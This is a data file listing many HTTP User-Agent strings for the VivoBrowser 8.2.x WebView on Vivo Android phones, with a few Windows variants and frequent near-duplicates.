Mozilla/5.0 (Linux; Android 12; V2130; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 1951; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1804 Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 10; vivo 1804; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 12; V2045; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 11; vivo 1909; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1802 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1916 Build/PKQ1.190626.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; I1927; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 9; vivo 1907 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1921 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1951 Build/PKQ1.181030.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1909; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 11; vivo 1818; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; V2043; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.2
Mozilla/5.0 (Linux; Android 10; vivo 1929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.0
Mozilla/5.0 (Linux; Android 11; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1938; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 12; V2046; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 VivoBrowser/8.2.2.1 Chrome/87.0.4280.141
Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 11; vivo 1951; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 11; vivo 1910; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.3
Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908_19 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1727 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 10; vivo 1804; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.5
Mozilla/5.0 (Linux; Android 11; vivo 1919; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; V2038; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 1910; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 11; vivo 1818; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; V2069; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; V2029; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 7.0; vivo 1713 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1907_19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.1
Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 2004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; V2026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 10; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 7.0; vivo 1713 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1818; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; V2134; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.1
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2038; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1806; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1907 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.1
Mozilla/5.0 (Linux; Android 11; V2033; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 12; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 VivoBrowser/8.2.0.6 Chrome/87.0.4280.141
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1804; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; V2029; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1919; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1801 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1938; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 VivoBrowser/8.2.0.2 Chrome/87.0.4280.141
Mozilla/5.0 (Linux; Android 7.0; vivo 1714 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 12; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2070; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1919; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 11; V2033; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1909; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.5
Mozilla/5.0 (Linux; Android 11; vivo 1951; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1920 Build/PKQ1.190626.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2069; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1909; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2068; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1906; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1951; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.0
Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1815 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1727 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 12; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 12; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2033; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1951; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 11; V2031; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1725 Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1806; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
